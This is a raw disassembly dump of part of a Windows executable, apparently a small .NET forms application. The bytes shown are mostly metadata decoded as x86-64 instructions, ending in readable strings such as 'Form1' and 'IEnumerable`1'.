   14000255d:	07                   	(bad)
   14000255e:	0e                   	(bad)
   14000255f:	00 14 06             	add    %dl,(%rsi,%rax,1)
   140002562:	8c 04 0e             	mov    %es,(%rsi,%rcx,1)
   140002565:	00 22                	add    %ah,(%rdx)
   140002567:	07                   	(bad)
   140002568:	2c 06                	sub    $0x6,%al
   14000256a:	06                   	(bad)
   14000256b:	00 de                	add    %bl,%dh
   14000256d:	04 4d                	add    $0x4d,%al
   14000256f:	00 06                	add    %al,(%rsi)
   140002571:	00 e4                	add    %ah,%ah
   140002573:	04 4d                	add    $0x4d,%al
   140002575:	00 0e                	add    %cl,(%rsi)
   140002577:	00 8a 07 4a 07 0e    	add    %cl,0xe074a07(%rdx)
   14000257d:	00 cf                	add    %cl,%bh
   14000257f:	01 4a 07             	add    %ecx,0x7(%rdx)
   140002582:	06                   	(bad)
   140002583:	00 bb 07 42 05 06    	add    %bh,0x6054207(%rbx)
   140002589:	00 7e 01             	add    %bh,0x1(%rsi)
   14000258c:	f3 04 06             	repz add $0x6,%al
   14000258f:	00 6c 05 42          	add    %ch,0x42(%rbp,%rax,1)
   140002593:	05 06 00 2f 02       	add    $0x22f0006,%eax
   140002598:	69 06 0e 00 58 02    	imul   $0x258000e,(%rsi),%eax
   14000259e:	fc                   	cld
   14000259f:	05 06 00 6f 02       	add    $0x26f0006,%eax
   1400025a4:	2c 06                	sub    $0x6,%al
   1400025a6:	06                   	(bad)
   1400025a7:	00 d8                	add    %bl,%al
   1400025a9:	05 89 06 06 00       	add    $0x60689,%eax
   1400025ae:	77 05                	ja     0x1400025b5
   1400025b0:	2d 05 0e 00 02       	sub    $0x2000e05,%eax
   1400025b5:	02 8c 04 0e 00 a0 02 	add    0x2a0000e(%rsp,%rax,1),%cl
   1400025bc:	8c 04 0e             	mov    %es,(%rsi,%rcx,1)
   1400025bf:	00 b7 01 18 05 06    	add    %dh,0x6051801(%rdi)
   1400025c5:	00 c8                	add    %cl,%al
   1400025c7:	00 f3                	add    %dh,%bl
   1400025c9:	04 0e                	add    $0xe,%al
   1400025cb:	00 15 06 8c 04 0a    	add    %dl,0xa048c06(%rip)        # 0x14a04b1d7
   1400025d1:	00 b7 04 0d 07 0a    	add    %dh,0xa070d04(%rdi)
   1400025d7:	00 af 00 0d 07 12    	add    %ch,0x12070d00(%rdi)
   1400025dd:	00 37                	add    %dh,(%rdi)
   1400025df:	04 67                	add    $0x67,%al
   1400025e1:	04 0a                	add    $0xa,%al
   1400025e3:	00 c0                	add    %al,%al
   1400025e5:	04 0d                	add    $0xd,%al
   1400025e7:	07                   	(bad)
   1400025e8:	0e                   	(bad)
   1400025e9:	00 9c 05 2c 06 0e 00 	add    %bl,0xe062c(%rbp,%rax,1)
   1400025f0:	2f                   	(bad)
   1400025f1:	01 2c 06             	add    %ebp,(%rsi,%rax,1)
   1400025f4:	06                   	(bad)
   1400025f5:	00 b1 07 f3 04 0e    	add    %dh,0xe04f307(%rcx)
   1400025fb:	00 e8                	add    %ch,%al
   1400025fd:	05 4a 07 0e 00       	add    $0xe074a,%eax
   140002602:	6e                   	outsb  (%rsi),(%dx)
   140002603:	01 4a 07             	add    %ecx,0x7(%rdx)
   140002606:	0e                   	(bad)
   140002607:	00 8e 07 4a 07 0e    	add    %cl,0xe074a07(%rsi)
   14000260d:	00 d3                	add    %dl,%bl
   14000260f:	01 4a 07             	add    %ecx,0x7(%rdx)
   140002612:	06                   	(bad)
   140002613:	00 54 05 f3          	add    %dl,-0xd(%rbp,%rax,1)
   140002617:	04 06                	add    $0x6,%al
   140002619:	00 37                	add    %dh,(%rdi)
   14000261b:	00 f3                	add    %dh,%bl
   14000261d:	04 16                	add    $0x16,%al
   14000261f:	00 bd 00 ad 05 06    	add    %bh,0x605ad00(%rbp)
   140002625:	00 23                	add    %ah,(%rbx)
   140002627:	00 60 00             	add    %ah,0x0(%rax)
   14000262a:	06                   	(bad)
   14000262b:	00 83 05 42 05 06    	add    %al,0x6054205(%rbx)
   140002631:	00 f2                	add    %dh,%dl
   140002633:	06                   	(bad)
   140002634:	42 05 06 00 c6 05    	rex.X add $0x5c60006,%eax
   14000263a:	42 05 06 00 56 04    	rex.X add $0x4560006,%eax
   140002640:	f3 04 06             	repz add $0x6,%al
   140002643:	00 fb                	add    %bh,%bl
   140002645:	00 f3                	add    %dh,%bl
   140002647:	04 0e                	add    $0xe,%al
   140002649:	00 c2                	add    %al,%dl
   14000264b:	01 18                	add    %ebx,(%rax)
   14000264d:	05 00 00 00 00       	add    $0x0,%eax
   140002652:	44 00 00             	add    %r8b,(%rax)
   140002655:	00 00                	add    %al,(%rax)
   140002657:	00 01                	add    %al,(%rcx)
   140002659:	00 01                	add    %al,(%rcx)
   14000265b:	00 00                	add    %al,(%rax)
   14000265d:	00 10                	add    %dl,(%rax)
   14000265f:	00 eb                	add    %ch,%bl
   140002661:	04 0b                	add    $0xb,%al
   140002663:	05 41 00 01 00       	add    $0x10041,%eax
   140002668:	01 00                	add    %eax,(%rax)
   14000266a:	01 00                	add    %eax,(%rax)
   14000266c:	10 00                	adc    %al,(%rax)
   14000266e:	31 00                	xor    %eax,(%rax)
   140002670:	0b 05 49 00 01 00    	or     0x10049(%rip),%eax        # 0x1400126bf
   140002676:	03 00                	add    (%rax),%eax
   140002678:	01 00                	add    %eax,(%rax)
   14000267a:	10 00                	adc    %al,(%rax)
   14000267c:	3e 00 0b             	ds add %cl,(%rbx)
   14000267f:	05 49 00 02 00       	add    $0x20049,%eax
   140002684:	0a 00                	or     (%rax),%al
   140002686:	00 00                	add    %al,(%rax)
   140002688:	10 00                	adc    %al,(%rax)
   14000268a:	90                   	nop
   14000268b:	06                   	(bad)
   14000268c:	d0 06                	rolb   $1,(%rsi)
   14000268e:	41 00 03             	add    %al,(%r11)
   140002691:	00 10                	add    %dl,(%rax)
   140002693:	00 00                	add    %al,(%rax)
   140002695:	01 10                	add    %edx,(%rax)
   140002697:	00 ff                	add    %bh,%bh
   140002699:	06                   	(bad)
   14000269a:	d0 06                	rolb   $1,(%rsi)
   14000269c:	8d 00                	lea    (%rax),%eax
   14000269e:	05 00 14 00 01       	add    $0x1001400,%eax
   1400026a3:	00 38                	add    %bh,(%rax)
   1400026a5:	07                   	(bad)
   1400026a6:	68 01 01 00 38       	push   $0x38000101
   1400026ab:	07                   	(bad)
   1400026ac:	68 01 11 00 ff       	push   $0xffffffffff001101
   1400026b1:	04 6c                	add    $0x6c,%al
   1400026b3:	01 11                	add    %edx,(%rcx)
   1400026b5:	00 a7 01 70 01 11    	add    %ah,0x11017001(%rdi)
   1400026bb:	00 9b 00 75 01 48    	add    %bl,0x48017500(%rbx)
   1400026c1:	20 00                	and    %al,(%rax)
   1400026c3:	00 00                	add    %al,(%rax)
   1400026c5:	00 91 00 13 05 79    	add    %dl,0x79051300(%rcx)
   1400026cb:	01 01                	add    %eax,(%rcx)
   1400026cd:	00 51 20             	add    %dl,0x20(%rcx)
   1400026d0:	00 00                	add    %al,(%rax)
   1400026d2:	00 00                	add    %al,(%rax)
   1400026d4:	86 18                	xchg   %bl,(%rax)
   1400026d6:	1f                   	(bad)
   1400026d7:	06                   	(bad)
   1400026d8:	06                   	(bad)
   1400026d9:	00 02                	add    %al,(%rdx)
   1400026db:	00 5c 20 00          	add    %bl,0x0(%rax,%riz,1)
   1400026df:	00 00                	add    %al,(%rax)
   1400026e1:	00 c4                	add    %al,%ah
   1400026e3:	00 eb                	add    %ch,%bl
   1400026e5:	01 15 00 02 00 93    	add    %edx,-0x6cfffe00(%rip)        # 0xd30028eb
   1400026eb:	20 00                	and    %al,(%rax)
   1400026ed:	00 00                	add    %al,(%rax)
   1400026ef:	00 81 00 70 07 06    	add    %al,0x6077000(%rcx)
   1400026f5:	00 03                	add    %al,(%rbx)
   1400026f7:	00 cb                	add    %cl,%bl
   1400026f9:	20 00                	and    %al,(%rax)
   1400026fb:	00 00                	add    %al,(%rax)
   1400026fd:	00 86 18 1f 06 06    	add    %al,0x6061f18(%rsi)
   140002703:	00 03                	add    %al,(%rbx)
   140002705:	00 e4                	add    %ah,%ah
   140002707:	20 00                	and    %al,(%rax)
   140002709:	00 00                	add    %al,(%rax)
   14000270b:	00 83 00 5e 05 7f    	add    %al,0x7f055e00(%rbx)
   140002711:	01 03                	add    %eax,(%rbx)
   140002713:	00 54 21 00          	add    %dl,0x0(%rcx,%riz,1)
   140002717:	00 00                	add    %al,(%rax)
   140002719:	00 81 00 76 04 86    	add    %al,-0x79fb8a00(%rcx)
   14000271f:	01 04 00             	add    %eax,(%rax,%rax,1)
   140002722:	8c 21                	mov    %fs,(%rcx)
   140002724:	00 00                	add    %al,(%rax)
   140002726:	00 00                	add    %al,(%rax)
   140002728:	81 00 ab 07 8c 01    	addl   $0x18c07ab,(%rax)
   14000272e:	05 00 e4 21 00       	add    $0x21e400,%eax
   140002733:	00 00                	add    %al,(%rax)
   140002735:	00 83 00 e3 06 36    	add    %al,0x3606e300(%rbx)
   14000273b:	01 06                	add    %eax,(%rsi)
   14000273d:	00 0c 22             	add    %cl,(%rdx,%riz,1)
   140002740:	00 00                	add    %al,(%rax)
   140002742:	00 00                	add    %al,(%rax)
   140002744:	c4                   	(bad)
   140002745:	00 eb                	add    %ch,%bl
   140002747:	01 15 00 06 00 44    	add    %edx,0x44000600(%rip)        # 0x184002d4d
   14000274d:	22 00                	and    (%rax),%al
   14000274f:	00 00                	add    %al,(%rax)
   140002751:	00 81 00 70 07 06    	add    %al,0x6077000(%rcx)
   140002757:	00 07                	add    %al,(%rdi)
   140002759:	00 93 22 00 00 00    	add    %dl,0x22(%rbx)
   14000275f:	00 86 18 1f 06 06    	add    %al,0x6061f18(%rsi)
   140002765:	00 07                	add    %al,(%rdi)
   140002767:	00 b4 22 00 00 00 00 	add    %dh,0x0(%rdx,%riz,1)
   14000276e:	81 00 ff 06 06 00    	addl   $0x606ff,(%rax)
   140002774:	07                   	(bad)
   140002775:	00 50 23             	add    %dl,0x23(%rax)
   140002778:	00 00                	add    %al,(%rax)
   14000277a:	00 00                	add    %al,(%rax)
   14000277c:	81 00 01 00 92 01    	addl   $0x1920001,(%rax)
   140002782:	07                   	(bad)
   140002783:	00 63 23             	add    %ah,0x23(%rbx)
   140002786:	00 00                	add    %al,(%rax)
   140002788:	00 00                	add    %al,(%rax)
   14000278a:	81 00 12 00 98 01    	addl   $0x1980012,(%rax)
   140002790:	08 00                	or     %al,(%rax)
   140002792:	76 23                	jbe    0x1400027b7
   140002794:	00 00                	add    %al,(%rax)
   140002796:	00 00                	add    %al,(%rax)
   140002798:	83 18 1f             	sbbl   $0x1f,(%rax)
   14000279b:	06                   	(bad)
   14000279c:	06                   	(bad)
   14000279d:	00 09                	add    %cl,(%rcx)
   14000279f:	00 80 23 00 00 00    	add    %al,0x23(%rax)
   1400027a5:	00 93 08 d4 05 9e    	add    %dl,-0x61fa2bf8(%rbx)
   1400027ab:	01 09                	add    %ecx,(%rcx)
   1400027ad:	00 c8                	add    %cl,%al
   1400027af:	23 00                	and    (%rax),%eax
   1400027b1:	00 00                	add    %al,(%rax)
   1400027b3:	00 93 08 8f 01 a3    	add    %dl,-0x5cfe70f8(%rbx)
   1400027b9:	01 09                	add    %ecx,(%rcx)
   1400027bb:	00 df                	add    %bl,%bh
   1400027bd:	23 00                	and    (%rax),%eax
   1400027bf:	00 00                	add    %al,(%rax)
   1400027c1:	00 93 08 9b 01 a9    	add    %dl,-0x56fe64f8(%rbx)
   1400027c7:	01 09                	add    %ecx,(%rcx)
   1400027c9:	00 e8                	add    %ch,%al
   1400027cb:	23 00                	and    (%rax),%eax
   1400027cd:	00 00                	add    %al,(%rax)
   1400027cf:	00 96 08 55 07 b0    	add    %dl,-0x4ff8aaf8(%rsi)
   1400027d5:	01 0a                	add    %ecx,(%rdx)
   1400027d7:	00 ff                	add    %bh,%bh
   1400027d9:	23 00                	and    (%rax),%eax
   1400027db:	00 00                	add    %al,(%rax)
   1400027dd:	00 86 18 1f 06 06    	add    %al,0x6061f18(%rsi)
   1400027e3:	00 0a                	add    %cl,(%rdx)
   1400027e5:	00 08                	add    %cl,(%rax)
   1400027e7:	24 00                	and    $0x0,%al
   1400027e9:	00 00                	add    %al,(%rax)
   1400027eb:	00 91 18 25 06 b5    	add    %dl,-0x4af9dae8(%rcx)
   1400027f1:	01 0a                	add    %ecx,(%rdx)
   1400027f3:	00 00                	add    %al,(%rax)
   1400027f5:	00 01                	add    %al,(%rcx)
   1400027f7:	00 08                	add    %cl,(%rax)
   1400027f9:	07                   	(bad)
   1400027fa:	00 00                	add    %al,(%rax)
   1400027fc:	01 00                	add    %eax,(%rax)
   1400027fe:	5d                   	pop    %rbp
   1400027ff:	04 00                	add    $0x0,%al
   140002801:	00 01                	add    %al,(%rcx)
   140002803:	00 cd                	add    %cl,%ch
   140002805:	05 00 00 01 00       	add    $0x10000,%eax
   14000280a:	17                   	(bad)
   14000280b:	02 00                	add    (%rax),%al
   14000280d:	00 01                	add    %al,(%rcx)
   14000280f:	00 c8                	add    %cl,%al
   140002811:	04 00                	add    $0x0,%al
   140002813:	00 01                	add    %al,(%rcx)
   140002815:	00 5d 04             	add    %bl,0x4(%rbp)
   140002818:	00 00                	add    %al,(%rax)
   14000281a:	01 00                	add    %eax,(%rax)
   14000281c:	ad                   	lods   (%rsi),%eax
   14000281d:	07                   	(bad)
   14000281e:	00 00                	add    %al,(%rax)
   140002820:	01 00                	add    %eax,(%rax)
   140002822:	ad                   	lods   (%rsi),%eax
   140002823:	07                   	(bad)
   140002824:	00 00                	add    %al,(%rax)
   140002826:	01 00                	add    %eax,(%rax)
   140002828:	fc                   	cld
   140002829:	03 09                	add    (%rcx),%ecx
   14000282b:	00 1f                	add    %bl,(%rdi)
   14000282d:	06                   	(bad)
   14000282e:	01 00                	add    %eax,(%rax)
   140002830:	11 00                	adc    %eax,(%rax)
   140002832:	1f                   	(bad)
   140002833:	06                   	(bad)
   140002834:	06                   	(bad)
   140002835:	00 19                	add    %bl,(%rcx)
   140002837:	00 1f                	add    %bl,(%rdi)
   140002839:	06                   	(bad)
   14000283a:	0a 00                	or     (%rax),%al
   14000283c:	29 00                	sub    %eax,(%rax)
   14000283e:	1f                   	(bad)
   14000283f:	06                   	(bad)
   140002840:	10 00                	adc    %al,(%rax)
   140002842:	31 00                	xor    %eax,(%rax)
   140002844:	1f                   	(bad)
   140002845:	06                   	(bad)
   140002846:	10 00                	adc    %al,(%rax)
   140002848:	39 00                	cmp    %eax,(%rax)
   14000284a:	1f                   	(bad)
   14000284b:	06                   	(bad)
   14000284c:	10 00                	adc    %al,(%rax)
   14000284e:	41 00 1f             	add    %bl,(%r15)
   140002851:	06                   	(bad)
   140002852:	10 00                	adc    %al,(%rax)
   140002854:	49 00 1f             	rex.WB add %bl,(%r15)
   140002857:	06                   	(bad)
   140002858:	10 00                	adc    %al,(%rax)
   14000285a:	51                   	push   %rcx
   14000285b:	00 1f                	add    %bl,(%rdi)
   14000285d:	06                   	(bad)
   14000285e:	10 00                	adc    %al,(%rax)
   140002860:	59                   	pop    %rcx
   140002861:	00 1f                	add    %bl,(%rdi)
   140002863:	06                   	(bad)
   140002864:	10 00                	adc    %al,(%rax)
   140002866:	61                   	(bad)
   140002867:	00 1f                	add    %bl,(%rdi)
   140002869:	06                   	(bad)
   14000286a:	15 00 69 00 1f       	adc    $0x1f006900,%eax
   14000286f:	06                   	(bad)
   140002870:	10 00                	adc    %al,(%rax)
   140002872:	71 00                	jno    0x140002874
   140002874:	1f                   	(bad)
   140002875:	06                   	(bad)
   140002876:	10 00                	adc    %al,(%rax)
   140002878:	79 00                	jns    0x14000287a
   14000287a:	1f                   	(bad)
   14000287b:	06                   	(bad)
   14000287c:	10 00                	adc    %al,(%rax)
   14000287e:	89 00                	mov    %eax,(%rax)
   140002880:	1f                   	(bad)
   140002881:	06                   	(bad)
   140002882:	06                   	(bad)
   140002883:	00 e1                	add    %ah,%cl
   140002885:	00 1f                	add    %bl,(%rdi)
   140002887:	06                   	(bad)
   140002888:	06                   	(bad)
   140002889:	00 e9                	add    %ch,%cl
   14000288b:	00 1f                	add    %bl,(%rdi)
   14000288d:	06                   	(bad)
   14000288e:	1a 00                	sbb    (%rax),%al
   140002890:	f1                   	int1
   140002891:	00 1f                	add    %bl,(%rdi)
   140002893:	06                   	(bad)
   140002894:	06                   	(bad)
   140002895:	00 11                	add    %dl,(%rcx)
   140002897:	01 1f                	add    %ebx,(%rdi)
   140002899:	06                   	(bad)
   14000289a:	20 00                	and    %al,(%rax)
   14000289c:	81 00 1f 06 06 00    	addl   $0x6061f,(%rax)
   1400028a2:	21 01                	and    %eax,(%rcx)
   1400028a4:	eb 01                	jmp    0x1400028a7
   1400028a6:	06                   	(bad)
   1400028a7:	00 91 00 eb 01 15    	add    %dl,0x1501eb00(%rcx)
   1400028ad:	00 29                	add    %ch,(%rcx)
   1400028af:	01 1f                	add    %ebx,(%rdi)
   1400028b1:	06                   	(bad)
   1400028b2:	06                   	(bad)
   1400028b3:	00 31                	add    %dh,(%rcx)
   1400028b5:	01 ab 00 2b 00 41    	add    %ebp,0x41002b00(%rbx)
   1400028bb:	01 1f                	add    %ebx,(%rdi)
   1400028bd:	06                   	(bad)
   1400028be:	32 00                	xor    (%rax),%al
   1400028c0:	91                   	xchg   %eax,%ecx
   1400028c1:	00 2d 04 38 00 49    	add    %ch,0x49003804(%rip)        # 0x1890060cb
   1400028c7:	01 a2 07 10 00 91    	add    %esp,-0x6effeff9(%rdx)
   1400028cd:	00 1f                	add    %bl,(%rdi)
   1400028cf:	06                   	(bad)
   1400028d0:	06                   	(bad)
   1400028d1:	00 a1 00 1f 06 06    	add    %ah,0x6061f00(%rcx)
   1400028d7:	00 a1 00 8e 05 49    	add    %ah,0x49058e00(%rcx)
   1400028dd:	00 51 01             	add    %dl,0x1(%rcx)
   1400028e0:	54                   	push   %rsp
   1400028e1:	01 10                	add    %edx,(%rax)
   1400028e3:	00 51 01             	add    %dl,0x1(%rcx)
   1400028e6:	2a 07                	sub    (%rdi),%al
   1400028e8:	10 00                	adc    %al,(%rax)
   1400028ea:	51                   	push   %rcx
   1400028eb:	01 1f                	add    %ebx,(%rdi)
   1400028ed:	01 4f 00             	add    %ecx,0x0(%rdi)
   1400028f0:	a1 00 84 07 56 00 a1 	movabs 0x8000a10056078400,%eax
   1400028f7:	00 80 
   1400028f9:	00 56 00             	add    %dl,0x0(%rsi)
   1400028fc:	61                   	(bad)
   1400028fd:	01 f3                	add    %esi,%ebx
   1400028ff:	01 5a 00             	add    %ebx,0x0(%rdx)
   140002902:	a9 00 1f 06 06       	test   $0x6061f00,%eax
   140002907:	00 b1 00 65 05 6c    	add    %dh,0x6c056500(%rcx)
   14000290d:	00 a9 00 af 07 72    	add    %ch,0x7207af00(%rcx)
   140002913:	00 b1 00 eb 01 06    	add    %dh,0x601eb00(%rcx)
   140002919:	00 69 01             	add    %ch,0x1(%rcx)
   14000291c:	a2 04 82 00 79 01 fb 	movabs %al,0x8901fb0179008204
   140002923:	01 89 
   140002925:	00 79 01             	add    %bh,0x1(%rcx)
   140002928:	df 01                	filds  (%rcx)
   14000292a:	90                   	nop
   14000292b:	00 81 01 cc 04 96    	add    %al,-0x69fb33ff(%rcx)
   140002931:	00 c9                	add    %cl,%cl
   140002933:	00 7b 00             	add    %bh,0x0(%rbx)
   140002936:	a0 00 49 01 4b 01 10 	movabs 0xc90010014b014900,%al
   14000293d:	00 c9 
   14000293f:	00 c4                	add    %al,%ah
   140002941:	07                   	(bad)
   140002942:	b3 00                	mov    $0x0,%bl
   140002944:	89 01                	mov    %eax,(%rcx)
   140002946:	1f                   	(bad)
   140002947:	06                   	(bad)
   140002948:	06                   	(bad)
   140002949:	00 c9                	add    %cl,%cl
   14000294b:	00 e9                	add    %ch,%cl
   14000294d:	06                   	(bad)
   14000294e:	bb 00 0c 00 1f       	mov    $0x1f000c00,%ebx
   140002953:	06                   	(bad)
   140002954:	ca 00 99             	lret   $0x9900
   140002957:	01 61 07             	add    %esp,0x7(%rcx)
   14000295a:	d0 00                	rolb   $1,(%rax)
   14000295c:	d1 00                	roll   $1,(%rax)
   14000295e:	c4 07 ea 00          	(bad)
   140002962:	d1 00                	roll   $1,(%rax)
   140002964:	3f                   	(bad)
   140002965:	06                   	(bad)
   140002966:	f2 00 14 00          	repnz add %dl,(%rax,%rax,1)
   14000296a:	1f                   	(bad)
   14000296b:	06                   	(bad)
   14000296c:	ca 00 d9             	lret   $0xd900
   14000296f:	00 c4                	add    %al,%ah
   140002971:	07                   	(bad)
   140002972:	06                   	(bad)
   140002973:	01 a9 01 42 01 0e    	add    %ebp,0xe014201(%rcx)
   140002979:	01 d1                	add    %edx,%ecx
   14000297b:	00 b9 05 12 01 d1    	add    %bh,-0x2efeedfb(%rcx)
   140002981:	00 61 01             	add    %ah,0x1(%rcx)
   140002984:	0e                   	(bad)
   140002985:	01 49 01             	add    %ecx,0x1(%rcx)
   140002988:	99                   	cltd
   140002989:	07                   	(bad)
   14000298a:	0e                   	(bad)
   14000298b:	01 c1                	add    %eax,%ecx
   14000298d:	01 c4                	add    %eax,%esp
   14000298f:	07                   	(bad)
   140002990:	20 01                	and    %al,(%rcx)
   140002992:	49 01 42 01          	add    %rax,0x1(%r10)
   140002996:	0e                   	(bad)
   140002997:	01 d1                	add    %edx,%ecx
   140002999:	00 0d 01 2e 01 d1    	add    %cl,-0x2efed1ff(%rip)        # 0x1110157a0
   14000299f:	00 b7 07 36 01 f9    	add    %dh,-0x6fec9f9(%rdi)
   1400029a5:	00 1f                	add    %bl,(%rdi)
   1400029a7:	06                   	(bad)
   1400029a8:	3b 01                	cmp    (%rcx),%eax
   1400029aa:	19 01                	sbb    %eax,(%rcx)
   1400029ac:	1f                   	(bad)
   1400029ad:	06                   	(bad)
   1400029ae:	06                   	(bad)
   1400029af:	00 d1                	add    %dl,%cl
   1400029b1:	01 8e 00 4d 01 20    	add    %ecx,0x20014d00(%rsi)
   1400029b7:	00 7b 00             	add    %bh,0x0(%rbx)
   1400029ba:	d2 02                	rolb   %cl,(%rdx)
   1400029bc:	29 00                	sub    %eax,(%rax)
   1400029be:	9b                   	fwait
   1400029bf:	00 74 03 2e          	add    %dh,0x2e(%rbx,%rax,1)
   1400029c3:	00 0b                	add    %cl,(%rbx)
   1400029c5:	00 c9                	add    %cl,%cl
   1400029c7:	01 2e                	add    %ebp,(%rsi)
   1400029c9:	00 13                	add    %dl,(%rbx)
   1400029cb:	00 d2                	add    %dl,%dl
   1400029cd:	01 2e                	add    %ebp,(%rsi)
   1400029cf:	00 1b                	add    %bl,(%rbx)
   1400029d1:	00 f1                	add    %dh,%cl
   1400029d3:	01 2e                	add    %ebp,(%rsi)
   1400029d5:	00 23                	add    %ah,(%rbx)
   1400029d7:	00 fa                	add    %bh,%dl
   1400029d9:	01 2e                	add    %ebp,(%rsi)
   1400029db:	00 2b                	add    %ch,(%rbx)
   1400029dd:	00 fa                	add    %bh,%dl
   1400029df:	01 2e                	add    %ebp,(%rsi)
   1400029e1:	00 33                	add    %dh,(%rbx)
   1400029e3:	00 fa                	add    %bh,%dl
   1400029e5:	01 2e                	add    %ebp,(%rsi)
   1400029e7:	00 3b                	add    %bh,(%rbx)
   1400029e9:	00 00                	add    %al,(%rax)
   1400029eb:	02 2e                	add    (%rsi),%ch
   1400029ed:	00 43 00             	add    %al,0x0(%rbx)
   1400029f0:	16                   	(bad)
   1400029f1:	02 2e                	add    (%rsi),%ch
   1400029f3:	00 4b 00             	add    %cl,0x0(%rbx)
   1400029f6:	2e 02 2e             	cs add (%rsi),%ch
   1400029f9:	00 53 00             	add    %dl,0x0(%rbx)
   1400029fc:	fa                   	cli
   1400029fd:	01 2e                	add    %ebp,(%rsi)
   1400029ff:	00 5b 00             	add    %bl,0x0(%rbx)
   140002a02:	fa                   	cli
   140002a03:	01 2e                	add    %ebp,(%rsi)
   140002a05:	00 63 00             	add    %ah,0x0(%rbx)
   140002a08:	53                   	push   %rbx
   140002a09:	02 2e                	add    (%rsi),%ch
   140002a0b:	00 6b 00             	add    %ch,0x0(%rbx)
   140002a0e:	7d 02                	jge    0x140002a12
   140002a10:	2e 00 73 00          	cs add %dh,0x0(%rbx)
   140002a14:	8a 02                	mov    (%rdx),%al
   140002a16:	49 00 9b 00 74 03 a3 	rex.WB add %bl,-0x5cfc8c00(%r11)
   140002a1d:	00 8b 00 d7 02 a3    	add    %cl,-0x5cfd2900(%rbx)
   140002a23:	00 93 00 d2 02 a3    	add    %dl,-0x5cfd2e00(%rbx)
   140002a29:	00 83 00 d2 02 c3    	add    %al,-0x3cfd2e00(%rbx)
   140002a2f:	00 83 00 d2 02 c3    	add    %al,-0x3cfd2e00(%rbx)
   140002a35:	00 8b 00 19 03 c0    	add    %cl,-0x3ffce700(%rbx)
   140002a3b:	01 83 00 d2 02 e0    	add    %eax,-0x1ffd2e00(%rbx)
   140002a41:	01 83 00 d2 02 27    	add    %eax,0x2702d200(%rbx)
   140002a47:	00 3f                	add    %bh,(%rdi)
   140002a49:	00 63 00             	add    %ah,0x0(%rbx)
   140002a4c:	77 00                	ja     0x140002a4e
   140002a4e:	9b                   	fwait
   140002a4f:	00 a7 00 26 01 42    	add    %ah,0x42012600(%rdi)
   140002a55:	01 48 01             	add    %ecx,0x1(%rax)
   140002a58:	05 00 01 00 06       	add    $0x6000100,%eax
   140002a5d:	00 03                	add    %al,(%rbx)
   140002a5f:	00 00                	add    %al,(%rax)
   140002a61:	00 d8                	add    %bl,%al
   140002a63:	05 b9 01 00 00       	add    $0x1b9,%eax
   140002a68:	af                   	scas   (%rdi),%eax
   140002a69:	01 be 01 00 00 68    	add    %edi,0x68000001(%rsi)
   140002a6f:	07                   	(bad)
   140002a70:	c4 01 02 00          	(bad)
   140002a74:	11 00                	adc    %eax,(%rax)
   140002a76:	03 00                	add    (%rax),%eax
   140002a78:	02 00                	add    (%rax),%al
   140002a7a:	12 00                	adc    (%rax),%al
   140002a7c:	05 00 01 00 13       	add    $0x13000100,%eax
   140002a81:	00 05 00 02 00 14    	add    %al,0x14000200(%rip)        # 0x154002c87
   140002a87:	00 07                	add    %al,(%rdi)
   140002a89:	00 c1                	add    %al,%cl
   140002a8b:	00 f8                	add    %bh,%al
   140002a8d:	00 04 80             	add    %al,(%rax,%rax,4)
   140002a90:	00 00                	add    %al,(%rax)
   140002a92:	01 00                	add    %eax,(%rax)
   140002a94:	06                   	(bad)
   140002a95:	00 01                	add    %al,(%rcx)
	...
   140002a9f:	00 d4                	add    %dl,%ah
   140002aa1:	00 00                	add    %al,(%rax)
   140002aa3:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140002aae:	00 00                	add    %al,(%rax)
   140002ab0:	56                   	push   %rsi
   140002ab1:	01 57 00             	add    %edx,0x0(%rdi)
   140002ab4:	00 00                	add    %al,(%rax)
   140002ab6:	00 00                	add    %al,(%rax)
   140002ab8:	04 00                	add    $0x0,%al
	...
   140002ac2:	00 00                	add    %al,(%rax)
   140002ac4:	56                   	push   %rsi
   140002ac5:	01 0d 07 00 00 00    	add    %ecx,0x7(%rip)        # 0x140002ad2
   140002acb:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140002ad6:	00 00                	add    %al,(%rax)
   140002ad8:	56                   	push   %rsi
   140002ad9:	01 f3                	add    %esi,%ebx
   140002adb:	04 00                	add    $0x0,%al
   140002add:	00 00                	add    %al,(%rax)
   140002adf:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140002aea:	00 00                	add    %al,(%rax)
   140002aec:	5f                   	pop    %rdi
   140002aed:	01 67 04             	add    %esp,0x4(%rdi)
   140002af0:	00 00                	add    %al,(%rax)
   140002af2:	00 00                	add    %al,(%rax)
   140002af4:	04 00                	add    $0x0,%al
	...
   140002afe:	00 00                	add    %al,(%rax)
   140002b00:	56                   	push   %rsi
   140002b01:	01 83 01 00 00 00    	add    %eax,0x1(%rbx)
   140002b07:	00 00                	add    %al,(%rax)
   140002b09:	00 00                	add    %al,(%rax)
   140002b0b:	00 01                	add    %al,(%rcx)
   140002b0d:	00 00                	add    %al,(%rax)
   140002b0f:	00 9a 06 00 00 67    	add    %bl,0x67000006(%rdx)
   140002b15:	00 e5                	add    %ah,%ch
   140002b17:	00 67 00             	add    %ah,0x0(%rdi)
   140002b1a:	01 01                	add    %eax,(%rcx)
   140002b1c:	00 00                	add    %al,(%rax)
   140002b1e:	00 00                	add    %al,(%rax)
   140002b20:	00 3c 53             	add    %bh,(%rbx,%rdx,2)
   140002b23:	65 74 74             	gs je  0x140002b9a
   140002b26:	69 6e 67 73 3e 62 5f 	imul   $0x5f623e73,0x67(%rsi),%ebp
   140002b2d:	5f                   	pop    %rdi
   140002b2e:	34 5f                	xor    $0x5f,%al
   140002b30:	30 00                	xor    %al,(%rax)
   140002b32:	3c 53                	cmp    $0x53,%al
   140002b34:	65 74 74             	gs je  0x140002bab
   140002b37:	69 6e 67 73 3e 62 5f 	imul   $0x5f623e73,0x67(%rsi),%ebp
   140002b3e:	5f                   	pop    %rdi
   140002b3f:	34 5f                	xor    $0x5f,%al
   140002b41:	31 00                	xor    %eax,(%rax)
   140002b43:	49                   	rex.WB
   140002b44:	45 6e                	rex.RB outsb (%rsi),(%dx)
   140002b46:	75 6d                	jne    0x140002bb5
   140002b48:	65 72 61             	gs jb  0x140002bac
   140002b4b:	62 6c 65 60 31       	(bad)
   140002b50:	00 46 6f             	add    %al,0x6f(%rsi)
   140002b53:	72 6d                	jb     0x140002bc2
   140002b55:	31 00                	xor    %eax,(%rax)
   140002b57:	46 75 6e             	rex.RX jne 0x140002bc8
   140002b5a:	63 60 32             	movsxd 0x32(%rax),%esp
